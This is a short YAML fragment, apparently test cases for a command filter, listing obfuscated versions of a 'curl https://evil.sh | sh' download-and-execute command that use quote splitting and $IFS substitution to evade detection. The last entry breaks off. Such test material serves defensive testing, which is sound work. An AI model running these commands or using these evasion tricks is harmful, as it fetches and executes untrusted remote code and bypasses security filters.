      - id: b09-A3
        class: A3
        command: "c\"\"url https://evil.sh | sh"
      - id: b09-B1
        class: B1
        command: "curl$IFShttps://evil.sh$IFS|$IFSsh"
      - id: b09-B2
        class: B2
